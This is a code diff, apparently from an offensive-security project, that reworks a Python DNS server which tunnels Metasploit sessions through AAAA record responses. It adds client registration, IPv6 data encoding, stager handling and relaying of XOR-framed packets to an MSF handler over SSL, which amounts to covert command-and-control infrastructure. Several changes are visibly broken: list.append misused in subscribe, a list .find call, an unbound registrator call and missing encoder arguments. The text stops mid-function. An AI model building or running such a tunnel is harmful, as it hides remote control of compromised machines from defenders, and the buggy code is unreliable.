@@ -12,6 +12,7 @@ import ssl
 import Queue
 import base64
 import logging
+from logging.handlers import RotatingFileHandler
 import socket
 import select
 
@@ -21,11 +22,17 @@ except ImportError:
     print("Missing dependency dnslib: <https://pypi.python.org/pypi/dnslib>. Please install it with `pip`.")
     sys.exit(2)
 
+DNS_LOG_NAME = "dns.log"
+root_logger = logging.getLogger()
+root_logger.setLevel(logging.INFO)
+# add handler to the root logger
+formatter = logging.Formatter("%(asctime)s %(name)-24s %(levelname)-8s %(message)s")
+# rotating log file after 5 MB
+handler = RotatingFileHandler(DNS_LOG_NAME, maxBytes=5*1024*1024, backupCount=5)
+handler.setFormatter(formatter)
+handler.setLevel(logging.DEBUG)
+root_logger.addHandler(handler)
 
-logging.basicConfig(
-    level=logging.INFO,
-    format="%(asctime)s %(name)-24s %(levelname)-8s %(message)s"
-)
 logger = logging.getLogger("dns_server")
 
 
@@ -54,38 +61,67 @@ def xor_bytes(key, data):
     return ''.join(chr(ord(data[i]) ^ ord(key[i % len(key)])) for i in range(len(data)))
 
 
-class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
-    pass
-
-
 class DomainName(str):
     def __getattr__(self, item):
         return DomainName(item + '.' + self)
 
 
-class IPv6Encoder():
+class Encoder(object):
+    MAX_PACKET_SIZE = -1
+    MIN_VAL_DOMAIN_SYMBOL = ord('a')
+    MAX_VAL_DOMAIN_SYMBOL = ord('z')
+
+    @staticmethod
+    def get_next_sdomain(current_sdomain):
+
+        def increment(lst, index):
+            carry_flag = False
+            val = lst[index]
+            assert(val >= Encoder.MIN_VAL_DOMAIN_SYMBOL)
+            if val > Encoder.MAX_VAL_DOMAIN_SYMBOL:
+                lst[index] = Encoder.MIN_VAL_DOMAIN_SYMBOL
+                carry_flag = True
+            else:
+                lst[index] += 1
+            return carry_flag
+
+        lst = [ord(x) for x in reversed(current_sdomain)]
+        for i, _ in enumerate(lst):
+            if not increment(lst, i):
+                break
+
+        return ''.join([chr(x) for x in reversed(lst)])
+
+    @staticmethod
+    def encode_data_header(sub_domain, data_size):
+        raise NotImplementedError()
+
+    @staticmethod
+    def encode_packet(packet_data):
+        raise NotImplementedError()
+
+    @staticmethod
+    def encode_ready_receive():
+        raise NotImplementedError()
+
+    @staticmethod
+    def encode_finish_send():
+        raise NotImplementedError()
+
+    @staticmethod
+    def encode_send_more_data():
+        raise NotImplementedError()
+
+    @staticmethod
+    def encode_registration():
+        raise NotImplementedError()
+
+
+class IPv6Encoder(Encoder):
     MAX_IPV6RR_NUM = 17
     MAX_DATA_IN_RR = 14
     MAX_PACKET_SIZE = MAX_IPV6RR_NUM * MAX_DATA_IN_RR
     IPV6_FORMAT = ":".join(["{:04x}"]*8)
-
-    @staticmethod
-    def get_next_sdomain(current_sdomain):
-        lst = [ord(x) for x in current_sdomain]
-        lst[-1] += 1
-        if lst[-1] > 122:
-            lst[-1] = 97
-            lst[-2] += 1
-            if lst[-2] > 122:
-                lst[-2] = 97
-                lst[-3] += 1
-                if lst[-3] > 122:
-                    lst[-3] = 97
-                    lst[-4] += 1
-                    if lst[-4] > 122:
-                        lst[-4] = 97
-
-        return ''.join([chr(x) for x in lst])
 
     @staticmethod
     def _encode_nextdomain_datasize(next_domain, data_size):
@@ -122,7 +158,7 @@ class IPv6Encoder():
         return IPv6Encoder.IPV6_FORMAT.format(*IPv6Encoder._align_hextets(hextets))
 
     @staticmethod
-    def encode_senddata_header(sub_domain, data_size):
+    def encode_data_header(sub_domain, data_size):
         return [IPv6Encoder.hextets_to_str(IPv6Encoder._encode_nextdomain_datasize(sub_domain, data_size))]
 
     @staticmethod
@@ -166,12 +202,25 @@ class IPv6Encoder():
         return ipv6blocks
 
     @staticmethod
+    def encode_packet(packet_data):
+        data_len = len(packet_data)
+        if data_len > IPv6Encoder.MAX_PACKET_SIZE:
+            raise ValueError("Data length is bigger than maximum packet size")
+        block = []
+        i = 0
+        while i < data_len:
+            next_i = min(i + IPv6Encoder.MAX_DATA_IN_RR, data_len)
+            num_rr = i // IPv6Encoder.MAX_DATA_IN_RR
+            is_last = (num_rr == (IPv6Encoder.MAX_IPV6RR_NUM - 1))
+            hextets = IPv6Encoder._encode_data_prefix(0xfe if is_last else 0xff,
+                                                      num_rr, packet_data[i:next_i])
+            block.append(IPv6Encoder.hextets_to_str(hextets))
+            i = next_i
+        return block
+
+    @staticmethod
     def encode_ready_receive():
         return ["ffff:0000:0000:0000:0000:0000:0000:0000"]
-    
-    @staticmethod 
-    def encode_registration(client_id, status):
-        return ["ffff:"+hex(ord(client_id))[2:4]+hex(status)[2:4]+":0000:0000:0000:0000:0000:0000"]
 
     @staticmethod
     def encode_finish_send():
@@ -181,128 +230,234 @@ class IPv6Encoder():
     def encode_send_more_data():
         return ["ffff:0000:0000:0000:0000:f000:0000:0000"]
 
-
-servers = []
-_clients = {}
-dns_server = None
-last_client = '`'
-
-def get_client_by_id(client_id):
-    if client_id in _clients:
-        return _clients[client_id]
+    @staticmethod
+    def encode_registration(client_id, status):
+        return ["ffff:"+hex(ord(client_id))[2:4]+"00:0000:0000:0000:0000:0000:0000"]
 
 
-def register_client(client, clid = None):
+class PartedData(object):
+    def __init__(self, expected_size=0):
+        self.expected_size = expected_size
+        self.current_size = 0
+        self.data = ""
 
-    if clid:
-        last_client = clid
-    else:
-        last_client = chr(ord(last_client)+1)
-    
-    if client_id == '{':
-        logger.error("Clients limit reached.")
-        return None
-    
-    _clients[last_client] = client
-        
-    return last_client
+    def reset(self, expected_size=0):
+        self.expected_size = expected_size
+        self.current_size = 0
+        self.data = ""
+
+    def add_part(self, data):
+        data_len = len(data)
+        if (self.current_size + data_len) > self.expected_size:
+            raise ValueError("PartedData overflow")
+        self.data += data
+        self.current_size += data_len
+
+    def is_complete(self):
+        return self.expected_size == self.current_size
+
+    def get_data(self):
+        return self.data
+
+    def get_expected_size(self):
+        return self.expected_size
+
+    def remain_size(self):
+        return self.expected_size - self.current_size
+
+
+class BlockSizedData(object):
+    def __init__(self, data, block_size):
+        self.data = data
+        self.block_size = block_size
+        self.data_size = len(self.data)
+
+    def get_data(self, block_index):
+        start_index = block_index * self.block_size
+        if start_index >= self.data_size:
+            raise IndexError("block index out of range")
+
+        end_index = min(start_index + self.block_size, self.data_size)
+        is_last = self.data_size == end_index
+        return is_last, self.data[start_index:end_index]
+
+    def get_size(self):
+        return self.data_size
+
+
+class Registrator(object):
+    __instance = None
+
+    @staticmethod
+    def instance():
+        if not Registrator.__instance:
+            Registrator.__instance = Registrator()
+        return Registrator.__instance
+
+    def __init__(self):
+        self.id_list = [chr(i) for i in range(ord('a'), ord('z')+1)]
+        self.clients = {}
+        self.servers = {}
+        self.waited_servers = {}
+        self.lock = threading.Lock()
+        self.logger = logging.getLogger(self.__class__.__name__)
+
+    def register_client_for_server(self, server_id, client):
+        client_id = None
+        notify_server = False
+        with self.lock:
+            try:
+                client_id = self.id_list.pop(0)
+                self.clients[client_id] = client
+                client_lst = self.servers.get(server_id, [])
+                client_lst.append(client)
+                self.servers[server_id] = client_lst
+                notify_server = True
+            except IndexError as e:
+                self.logger.error("Can't register new client for server %s(no free ids)", server_id, exc_info=True)
+                return None
+        if notify_server:
+            self._notify_waited_servers(server_id)
+        return client_id
+
+    def _notify_waited_servers(self, server_id):
+        notify_server = None
+        with self.lock:
+            waited_lst = self.waited_servers.get(server_id, [])
+            if waited_lst:
+                notify_server = waited_lst.pop(0)
+                if not waited_lst:
+                    del self.servers[server_id]
+        if notify_server:
+            notify_server.new_client()
+
+    def subscribe(self, server_id, server):
+        with self.lock:
+            self.waited_servers[server_id] = self.waited_servers.get(server_id, []).append(server)
+        self.logger.info("Subscription is done for server with %s id.", server_id)
+
+    def unsubscribe(self, server_id, server):
+        with self.lock:
+            waited_lst = self.servers.get(server_id, [])
+            if waited_lst:
+                i = waited_lst.find(server)
+                if i != -1:
+                    waited_lst.pop(i)
+        self.logger.info("Unsubscription is done for server with %s id.", server_id)
+
+
+    def get_client_by_id(self, client_id):
+        with self.lock:
+            try:
+                return self.clients[client_id]
+            except KeyError as e:
+                return None
+
+    def get_new_client_for_server(self, server_id):
+        assigned_client = None
+        with self.lock:
+            try:
+                clients = self.servers.get(server_id, [])
+                assigned_client = clients.pop(0)
+                if len(clients) == 0:
+                    del self.servers[server_id]
+            except IndexError as e:
+                pass
+        return assigned_client
+
+    def unregister_client(self, client_id):
+        with self.lock:
+            try:
+                del self.clients[client_id]
+                self.id_list.append(client_id)
+            except KeyError as e:
+                self.logger.error("Can't unregister client: client with id %s has not found", client_id)
 
 
 class Client(object):
-    STAGER = -1
-    PRE_REGISTRATION = 0
     INITIAL = 1
     INCOMING_DATA = 2
 
-
-    def __init__(self, clid = None):
-        self.client_id = register_client(self, clid)
-        
-        if not clid:
-            self.state = self.STAGER
-            self.sub_domain = "7812"
-        else:
-            self.state = self.PRE_REGISTRATION
-            self.sub_domain = "aaaa"
-            
-        self.received_data_size = 0
+    def __init__(self):
+        self.state = self.INITIAL
         self.logger = logging.getLogger(self.__class__.__name__)
-        #self.logger.setLevel(logging.DEBUG)
-        self.received_data = ""
+        # self.logger.setLevel(logging.DEBUG)
+        self.received_data = PartedData()
         self.last_received_index = -1
-        self.send_data = ""
-        self.enc_send_data = []
-        self.send_indexes = set()
+        self.sub_domain = "aaaa"
+        self.send_data = None
         self.server_queue = Queue.Queue()
         self.client_queue = Queue.Queue()
         self.server = None
+        self.client_id = None
+
+    def register_client(self, server_id, encoder):
+        client_id = Registrator.instance().register_client_for_server(server_id, self)
+        if client_id:
+            self.client_id = client_id
+            self.logger.info("Registered new client with %s id for server_id %s", client_id, server_id)
+            return encoder.encode_registration(client_id, 0)
+        else:
+            self.logger.info("Can't register client")
+            return encoder.encode_finish_send()
+
+    def get_id(self):
+        return self.client_id
 
     def _setup_receive(self, exp_data_size, padding):
         self.state = self.INCOMING_DATA
-        self.received_data_size = exp_data_size
-        self.received_data = ""
+        self.received_data.reset(exp_data_size)
         self.last_received_index = -1
         self.padding = padding
 
     def _initial_state(self):
         self.state = self.INITIAL
-        self.received_data = ""
+        self.received_data.reset()
         self.last_received_index = -1
-        self.received_data_size = 0
         self.padding = 0
 
     def set_server(self, server):
         self.server = server
-    
-    def new_client(self):
-        if self.state == self.PRE_REGISTRATION:
-            self.logger.info("NEW client: %s, status: %d", self.client_id, self.state)
-            return IPv6Encoder.encode_registration(self.client_id, self.state)
-    
-    #def new_client_confirmed(self, client_id):
-    #    self.state = self.INITIAL
-    #    self.logger.info("Confirmation for client: %s, status: %d", self.client_id, self.state)
-    #    return IPv6Encoder.encode_registration(self.client_id, self.state)
-    
-    def incoming_data_header(self, data_size, padding):
-        if self.received_data_size == data_size and self.state == self.INCOMING_DATA:
-            self.logger.info("Duplicated header request: waiting %d bytes of data with padding %d", data_size, padding)
-            return IPv6Encoder.encode_ready_receive()
-        elif self.state == self.INCOMING_DATA:
-            self.logger.error("Bad request. Client (%s) in the receiving data state", self.client_id)
-            return None
-        self.logger.info("Data header: waiting %d bytes of data (client %s)", data_size, self.client_id)
-        self._setup_receive(data_size, padding)
-        return IPv6Encoder.encode_ready_receive()
 
-    def incoming_data(self, data, index, counter):
+    def incoming_data_header(self, data_size, padding, encoder):
+        if self.received_data.get_expected_size() == data_size and self.state == self.INCOMING_DATA:
+            self.logger.info("Duplicated header request: waiting %d bytes of data with padding %d", data_size, padding)
+            return encoder.encode_ready_receive()
+        elif self.state == self.INCOMING_DATA:
+            self.logger.error("Bad request. Client in the receiving data state")
+            return None
+        self.logger.info("Data header: waiting %d bytes of data", data_size)
+        self._setup_receive(data_size, padding)
+        return encoder.encode_ready_receive()
+
+    def incoming_data(self, data, index, counter, encoder):
         self.logger.debug("Data %s, index %d", data, index)
         if self.state != self.INCOMING_DATA:
-            self.logger.error("Bad state(%d) for this action. Send finish. (client %s)", self.state, self.client_id)
-            return IPv6Encoder.encode_finish_send()
+            self.logger.error("Bad state(%d) for this action. Send finish.", self.state)
+            return encoder.encode_finish_send()
 
         data_size = len(data)
-
         if data_size == 0:
-            self.logger.error("Empty incoming data. Send finish. (client %s)", self.client_id)
-            return IPv6Encoder.encode_finish_send()
+            self.logger.error("Empty incoming data. Send finish.")
+            return encoder.encode_finish_send()
 
         if self.last_received_index >= index:
-            self.logger.info("Duplicated packet. (client %s)", self.client_id)
-            return IPv6Encoder.encode_send_more_data()
+            self.logger.info("Duplicated packet.")
+            return encoder.encode_send_more_data()
 
-        if len(self.received_data) + data_size > self.received_data_size:
-            self.logger.error("Overflow.Something was wrong. Send finish and clear all received data. (client %s)", self.client_id)
+        try:
+            self.received_data.add_part(data)
+        except ValueError:
+            self.logger.error("Overflow.Something was wrong. Send finish and clear all received data.")
             self._initial_state()
-            return IPv6Encoder.encode_finish_send()
+            return encoder.encode_finish_send()
 
-        self.received_data += data
         self.last_received_index = index
-        if len(self.received_data) == self.received_data_size:
-            self.logger.info("All expected data is received (client %s)", self.client_id)
+        if self.received_data.is_complete():
+            self.logger.info("All expected data is received")
             try:
-                packet = base64.b32decode(self.received_data + "=" * self.padding, True)
-                self.logger.info("Put decoded data to the server queue (client %s)", self.client_id)
+                packet = base64.b32decode(self.received_data.get_data() + "=" * self.padding, True)
+                self.logger.info("Put decoded data to the server queue")
                 self.server_queue.put(packet)
                 self._initial_state()
                 if self.server:
@@ -311,60 +466,54 @@ class Client(object):
             except Exception:
                 self.logger.error("Error during decode received data", exc_info=True)
                 self._initial_state()
-                return IPv6Encoder.encode_finish_send()
-        return IPv6Encoder.encode_send_more_data()
+                return encoder.encode_finish_send()
+        return encoder.encode_send_more_data()
 
-    def request_data_header(self, sub_domain):
+    def request_data_header(self, sub_domain, encoder):
         if sub_domain == self.sub_domain:
-            data_size = len(self.send_data)
-            if data_size == 0 and (len(self.enc_send_data) == 0 or len(self.send_indexes) == len(self.enc_send_data)):
-                data = None
+            if not self.send_data:
                 try:
-                    self.logger.info("Checking client (%s) queue...", self.client_id)
+                    self.logger.info("Checking client queue...")
                     data = self.client_queue.get_nowait()
+                    self.send_data = BlockSizedData(data, encoder.MAX_PACKET_SIZE)
                     self.logger.debug("New data size is %d", len(data))
                 except Queue.Empty:
                     pass
-                if data is not None:
-                    self.logger.info("There are new data for sending to client %s", self.client_id)
-                    self.send_data = data
-                    self.enc_send_data = ""
-            data_size = len(self.send_data)
-            if data_size != 0:
-                next_sub = IPv6Encoder.get_next_sdomain(self.sub_domain)
+            data_size = 0
+            if self.send_data:
+                next_sub = encoder.get_next_sdomain(self.sub_domain)
                 sub_domain = next_sub
-                if not self.enc_send_data:
-                    self.enc_send_data = IPv6Encoder.encode_data(self.send_data)
-                self.send_indexes = set()
-                #self.send_data = ""
+                data_size = self.send_data.get_size()
             else:
-                self.logger.info("No data for client %s.", slef.client_id)
+                self.logger.info("No data for client.")
             self.logger.info("Send data header to client with domain %s and size %d", sub_domain, data_size)
-            return IPv6Encoder.encode_senddata_header(sub_domain, data_size)
+            return encoder.encode_data_header(sub_domain, data_size)
         else:
             self.logger.info("Subdomain is different %s(request) - %s(client)", sub_domain, self.sub_domain)
             if sub_domain == "aaaa":
-                self.logger.info("MIGRATE DONE")
+                self.logger.info("MIGRATE.")
                 self.sub_domain = sub_domain
-                self.send_data = ""
-                self.enc_send_data = ""
+                self.send_data = None
             else:
                 self.sub_domain = sub_domain
-                self.send_data = ""
-                self.enc_send_data = ""
+                self.send_data = None
 
-    def request_data(self, sub_domain, index):
+    def request_data(self, sub_domain, index, encoder):
         self.logger.debug("request_data - %s, %d", sub_domain, index)
         if sub_domain != self.sub_domain:
             self.logger.error("request_data: subdomains are not equal(%s-%s)", self.sub_domain, sub_domain)
             return None
-        lst_size = len(self.enc_send_data)
-        if index < lst_size:
-            self.logger.debug("request_data: return data %s", self.enc_send_data[index])
-            self.send_indexes.add(index)
-            return self.enc_send_data[index]
-        else:
-            self.logger.error("request_data: index(%d) out of range (0,%d)", index, lst_size)
+
+        if not self.send_data:
+            self.logger.error("Bad request. There are no data.")
+            return None
+
+        try:
+            _, data = self.send_data.get_data(index)
+            self.logger.debug("request_data: return data %s", data)
+            return encoder.encode_packet(data)
+        except ValueError:
+            self.logger.error("request_data: index(%d) out of range.", index)
 
     def server_put_data(self, data):
         self.logger.info("Server adds data to queue.")
@@ -386,6 +535,7 @@ class Client(object):
 
 class Request(object):
     EXPR = None
+    OPTIONS = []
     LOGGER = logging.getLogger("Request")
 
     @classmethod
@@ -394,113 +544,119 @@ class Request(object):
             return cls.EXPR.match(qname)
 
     @classmethod
-    def handle(cls, qname):
+    def handle(cls, qname, dns_cls):
         m = cls.match(qname)
         if not m:
             return None
-        
-        client_id = m.group("client")
-        
-        if client_id == "0":
-            client = Client()
-        else:       
-            client = get_client_by_id(client_id)
-     
+        params = m.groupdict()
+        client = None
+        client_id = params.pop("client", None)
+        if client_id is None:
+            if "new_client" in cls.OPTIONS:
+                Request.LOGGER.info("Create a new client.")
+                client = Client()
+        else:
+            client = Registrator.instance().get_client_by_id(client_id)
         if client is not None:
             Request.LOGGER.info("Request will be handled by class %s", cls.__name__)
-            return cls._handle_client(client, m)
+            params["encoder"] = dns_cls.encoder
+
+            return cls._handle_client(client, **params)
         else:
             Request.LOGGER.error("Can't find client with name %s", client_id)
         return None
 
     @classmethod
-    def _handle_client(cls, client, match_data):
+    def _handle_client(cls, client, **kwargs):
         raise NotImplementedError()
 
 
 class GetDataHeader(Request):
-    EXPR = re.compile(r"(?P<sub_dom>\w{4})\.g\.(?P<rnd>\d+)\.(?P<client>[a-z])")
+    EXPR = re.compile(r"(?P<sub_dom>\w{4})\.g\.(?P<rnd>\d+)\.(?P<client>\w)")
 
     @classmethod
-    def _handle_client(cls, client, match_data):
-        sub_domain = match_data.group('sub_dom')
-        return client.request_data_header(sub_domain)
+    def _handle_client(cls, client, **kwargs):
+        sub_domain = kwargs['sub_dom']
+        encoder = kwargs['encoder']
+        return client.request_data_header(sub_domain, encoder)
+
 
 class GetStageHeader(Request):
     EXPR = re.compile(r"7812\.000g\.(?P<rnd>\d+)\.")
 
     @classmethod
-    def _handle_client(cls, client, match_data):
+    def _handle_client(cls, client, **kwargs):
         sub_domain = '7812'
         return client.request_data_header(sub_domain)
 
 
 class GetDataRequest(Request):
-    EXPR = re.compile(r"(?P<sub_dom>\w{4})\.(?P<index>\d+)\.(?P<rnd>\d+)\.(?P<client>[a-z])")
+    EXPR = re.compile(r"(?P<sub_dom>\w{4})\.(?P<index>\d+)\.(?P<rnd>\d+)\.(?P<client>\w)")
 
     @classmethod
-    def _handle_client(cls, client, match_data):
-        sub_domain = match_data.group('sub_dom')
-        index = int(match_data.group('index'))
-        return client.request_data(sub_domain, index)
+    def _handle_client(cls, client, **kwargs):
+        sub_domain = kwargs['sub_dom']
+        index = int(kwargs['index'])
+        encoder = kwargs['encoder']
+        return client.request_data(sub_domain, index, encoder)
+
 
 class GetStageRequest(Request):
     EXPR = re.compile(r"7812\.(?P<index>\d+)\.(?P<rnd>\d+)\.")
 
     @classmethod
-    def _handle_client(cls, client, match_data):
+    def _handle_client(cls, client, **kwargs):
         sub_domain = '7812'
-        index = int(match_data.group('index'))
+        index = int(kwargs['index'])
         return client.request_data(sub_domain, index)
 
+
 class IncomingDataRequest(Request):
-    EXPR = re.compile(r"t\.(?P<base64>.*)\.(?P<idx>\d+)\.(?P<cnt>\d+)\.(?P<client>[a-z])")
+    EXPR = re.compile(r"t\.(?P<base64>.*)\.(?P<idx>\d+)\.(?P<cnt>\d+)\.(?P<client>\w)")
 
     @classmethod
-    def _handle_client(cls, client, match_data):
-        enc_data = match_data.group('base64')
-        counter = int(match_data.group('cnt'))
-        index = int(match_data.group('idx'))
+    def _handle_client(cls, client, **kwargs):
+        enc_data = kwargs['base64']
+        counter = int(kwargs['cnt'])
+        index = int(kwargs['idx'])
+        encoder = kwargs['encoder']
         enc_data = re.sub(r"\.", "", enc_data)
-        #enc_data = re.sub(r"\-", "+", enc_data)
-        #enc_data = re.sub(r"\_", "/", enc_data)
-        return client.incoming_data(enc_data, index, counter)
+        return client.incoming_data(enc_data, index, counter, encoder)
 
 
 class IncomingDataHeaderRequest(Request):
-    EXPR = re.compile(r"(?P<size>\d+)\.(?P<padd>\d+)\.tx\.(?P<rnd>\d+)\.(?P<client>[a-z])")
+    EXPR = re.compile(r"(?P<size>\d+)\.(?P<padd>\d+)\.tx\.(?P<rnd>\d+)\.(?P<client>\w)")
 
     @classmethod
-    def _handle_client(cls, client, match_data):
-        size = int(match_data.group('size'))
-        padding = int(match_data.group('padd'))
-        return client.incoming_data_header(size, padding)
+    def _handle_client(cls, client, **kwargs):
+        size = int(kwargs['size'])
+        padding = int(kwargs['padd'])
+        encoder = kwargs['encoder']
+        return client.incoming_data_header(size, padding, encoder)
+
 
 class IncomingNewClient(Request):
-    EXPR = re.compile(r"aaaa\.g\.\d+\.(?P<client>0)\.")
+    EXPR = re.compile(r"7812\.reg0\.\d+\.(?P<server_id>\w+)")
+    OPTIONS = ["new_client"]
 
     @classmethod
-    def _handle_client(cls, client, match_data):
-        return client.new_client()
-        
-#class IncomingConfirmingClient(Request):
-#    EXPR = re.compile(r"aaaa\.r\.\d+\.(?P<client>[a-z])\.")
-#
-#    @classmethod
-#    def _handle_client(cls, client, match_data):
-#        return client.new_client_confirmed()
+    def _handle_client(cls, client, **kwargs):
+        return client.register_client(kwargs['server_id'], kwargs['encoder'])
+
 
 class AAAARequestHandler(object):
+    encoder = IPv6Encoder
+
     def __init__(self, domain):
         self.domain = domain
         self.logger = logging.getLogger(self.__class__.__name__)
-        #self.logger.setLevel(logging.DEBUG)
+        # self.logger.setLevel(logging.DEBUG)
         self.request_handler = [
-            IncomingNewClient,
             IncomingDataHeaderRequest,
             IncomingDataRequest,
             GetDataRequest,
-            GetDataHeader
+            GetDataHeader,
+            IncomingNewClient
         ]
 
     def process_request(self, reply, qname):
@@ -513,7 +669,7 @@ class AAAARequestHandler(object):
         self.logger.info("requested subdomain name is %s", sub_domain)
         is_handled = False
         for handler in self.request_handler:
-            answer = handler.handle(sub_domain)
+            answer = handler.handle(sub_domain, self.__class__)
             if answer is not None:
                 for rr in answer:
                     self.logger.debug("Add resource record to the reply %s", rr)
@@ -526,6 +682,17 @@ class AAAARequestHandler(object):
 
 
 class DnsServer(object):
+    __instance = None
+
+    @staticmethod
+    def create(domain, ipv4, ns_servers):
+        if not DnsServer.__instance:
+            DnsServer.__instance = DnsServer(domain, ipv4, ns_servers)
+
+    @staticmethod
+    def get_instance():
+        return DnsServer.__instance
+
     def __init__(self, domain, ipv4, ns_servers):
         self.domain = domain + "."
         self.ipv4 = ipv4
@@ -571,16 +738,15 @@ class DnsServer(object):
 
 def dns_response(data):
     try:
-        #logger.info("DATA:" + str(len(data))+ " " + str(data))
         request = DNSRecord.parse(data)
+        dns_server = DnsServer.get_instance()
         if dns_server:
             return dns_server.process_request(request)
         else:
             logger.error("Dns server is not created.")
-            return None
     except Exception as e:
-        logger.error("Parse error " + str(e) , exc_info=True)
-        return None
+        logger.error("Parse error " + str(e), exc_info=True)
+    return None
 
 
 class BaseRequestHandlerDNS(SocketServer.BaseRequestHandler):
@@ -600,42 +766,32 @@ class BaseRequestHandlerDNS(SocketServer.BaseRequestHandler):
             if dns_ans:
                 self.send_data(dns_ans)
         except Exception:
-            logger.error("Exception", exc_info=True)
+            logger.error("Exception in request handler.", exc_info=True)
 
 
 class MSFClient(object):
     HEADER_SIZE = 8
-    HEADER_STAGE_SIZE = 4
     BUFFER_SIZE = 2048
 
     INITIAL = 1
-    RECEIVING_DATA = 2
+    WAIT_CLIENT = 2
+    IDLE = 3
+    RECEIVING_DATA = 4
 
     LOGGER = logging.getLogger("MSFClient")
 
-    def __init__(self, sock, server, stageles, client_id):
+    def __init__(self, sock, server):
         self.sock = sock
-        self.stageles =  stageles
         self.ssl_socket = None
-        self.data = ""
-        self.need_read_size = 0
+        self.working_socket = sock
+        self.msf_data = PartedData()
         self.state = MSFClient.INITIAL
         self.server = server
-        
-        if not self.stageles:
-            self.client_id = '0'
-        else:
-            self.client_id = client_id
-        client = get_client_by_id(self.client_id)
-        client.set_server(self)
-        
-        if self.stageles:
-            self._setup_ssl()
-        else:
-            MSFClient.LOGGER.info("STAGE0 mode ready")
-            #self._setup_ssl()
+        self.msf_id = ""
+        self.client = None
+
     def get_socket(self):
-        return self.ssl_socket if self.ssl_socket else self.sock
+        return self.working_socket if self.state != self.WAIT_CLIENT else None
 
     def _setup_ssl(self):
         if self.ssl_socket is None:
@@ -649,6 +805,7 @@ class MSFClient(object):
                             server_side=False)
                 self.ssl_socket.setblocking(False)
                 self.ssl_socket.write("GET /123456789 HTTP/1.0\r\n\r\n")
+                self.working_socket = self.ssl_socket
             except:
                 MSFClient.LOGGER.error("Can't create ssl context:", exc_info=True)
                 self.sock.close()
@@ -657,9 +814,8 @@ class MSFClient(object):
     def _read_data(self, size):
         data = None
         try:
-            MSFClient.LOGGER.info("Reading %d", size)
-            data = self.get_socket().recv(size)
-            if not data and self.stageles:
+            data = self.working_socket.recv(size)
+            if not data:
                 MSFClient.LOGGER.info("SSL connection closed by client")
                 # self.ssl_socket.unwrap()
                 self.ssl_socket = None
@@ -669,103 +825,124 @@ class MSFClient(object):
             return data
         except ssl.SSLWantReadError:
             MSFClient.LOGGER.info("Not all data is prepared for decipher.Reread data later.")
-            #add small sleep
+            # add small sleep
             time.sleep(0.1)
             return None
         except:
+            # connection closed
+            if self.client:
+                client_id = self.client.get_id()
+                if client_id:
+                    MSFClient.LOGGER.info("Closing MSF connection and unregister client with id %s", client_id)
+                    Registrator.instance().unregister_client(client_id)
             MSFClient.LOGGER.error("Exception during read", exc_info=True)
             return None
 
-    def need_read(self):
+    def new_client(self):
+        if self.state == MSFClient.WAIT_CLIENT:
+            MSFClient.LOGGER.info("New MSF Client %d", self.msf_id)
+            client = Registrator.instance().get_new_client_for_server(self.msf_id)
+            if client:
+                MSFClient.LOGGER.info("MSF Client, with %c", client.get_id() )
+                self.client = client
+                client.set_server(self)
+                self._setup_ssl()
+                self.state = MSFClient.IDLE
+                Registrator.instance().unsubscribe(self.msf_id, self)
+                self.notify_data()
+        else:
+            self.LOGGER.error("Bad state(%d) for new client", self.state)
+
+    def read_new_data(self):
         if self.state == MSFClient.INITIAL:
+            # read msf id and register server
+            # msf id format: 1 byte - size, 2 .. size+1 - msf id
+            id_size_byte = self._read_data(1)
+            if id_size_byte:
+                id_size = struct.unpack("B", id_size_byte)[0]
+                msf_id = self._read_data(id_size)
+                if len(msf_id) == id_size:
+                    self.msf_id = msf_id
+                    client = Registrator.instance().get_new_client_for_server(msf_id)
+                    if client:
+                        self.client = client
+                        client.set_server(self)
+                        self._setup_ssl()
+                        self.state = MSFClient.IDLE
+                    else:
+                        Registrator.instance().subscribe(self.msf_id, self)
+                        self.state = MSFClient.WAIT_CLIENT
+                else:
+                    self.LOGGER.error("Incorrect server id data.Closing socket.")
+                    self.sock.close()
+                    self.server.remove_me(self)
+        elif self.state == MSFClient.WAIT_CLIENT:
+            client = Registrator.get_new_client_for_server(self.msf_id)
+            if client:
+                self.client = client
+                client.set_server(self)
+                self._setup_ssl()
+                self.state = MSFClient.IDLE
+        elif self.state == MSFClient.IDLE:
             # read header
-            header = self._read_data( (MSFClient.HEADER_SIZE if self.stageles else MSFClient.HEADER_STAGE_SIZE))
-            
+            header = self._read_data(MSFClient.HEADER_SIZE)
+
             if header is None:
-                MSFClient.LOGGER.info("Empty header")
                 return
-            
-            if (len(header) !=  (MSFClient.HEADER_SIZE if self.stageles else MSFClient.HEADER_STAGE_SIZE)):
+
+            if len(header) != MSFClient.HEADER_SIZE:
                 MSFClient.LOGGER.error("Can't read full header)")
                 return
-                
             MSFClient.LOGGER.debug("PARSE HEADER")
-            
-            if self.stageles:
-                xor_key = header[:4][::-1]
-                header_length = xor_bytes(xor_key, header[4:8])
-                pkt_length = struct.unpack('>I', header_length)[0] - 4
-                MSFClient.LOGGER.info("STAGELES incoming packet - need to read %d data", pkt_length)
-                self.need_read_size = pkt_length
-                self.data = header
-            else:
-                self.need_read_size = struct.unpack('>I',header[:4][::-1])[0]
-                MSFClient.LOGGER.info("STAGE0 incoming packet - need to read %d data", self.need_read_size)
-                
-            # try read immediately
-            data = self._read_data(self.need_read_size)
-            if data is None:
-                return
-            self.data += data
-            self.need_read_size -= len(data)
-            self.state = MSFClient.RECEIVING_DATA
-            if self.need_read_size == 0:
-                self.send_to_client(self.client_id)       
-        else:
-            MSFClient.LOGGER.info(" -no")
-            data = self._read_data(self.need_read_size)
-            if data is None:
-                return
-            self.data += data
-            self.need_read_size -= len(data)
+            xor_key = header[:4][::-1]
+            pkt_length_binary = xor_bytes(xor_key, header[4:8])
+            pkt_length = struct.unpack('>I', pkt_length_binary)[0]
+            self.msf_data.reset(pkt_length+4)
+            MSFClient.LOGGER.info("Incoming packet %d bytes", pkt_length+4)
+            self.msf_data.add_part(header)
 
-            if self.need_read_size == 0:
-                self.send_to_client(self.client_id)
+        data = self._read_data(self.msf_data.remain_size())
+        if data is None:
+            return
+        self.msf_data.add_part(data)
+
+        if self.msf_data.is_complete():
+            self.send_to_client()
+        else:
+            self.state = MSFClient.RECEIVING_DATA
 
     def want_write(self):
-        client = get_client_by_id(self.client_id)
-        if client:
-            return client.server_has_data()
+        if self.client:
+            return self.client.server_has_data()
         return False
 
     def notify_data(self):
         self.server.poll()
 
-    def send_to_client(self, client_id):
+    def send_to_client(self):
         MSFClient.LOGGER.info("All data from server is read. Sending to client.")
-        client = get_client_by_id(client_id)
-        if client:
-            client.server_put_data(self.data)
+        if self.client:
+            self.client.server_put_data(self.msf_data.get_data())
         else:
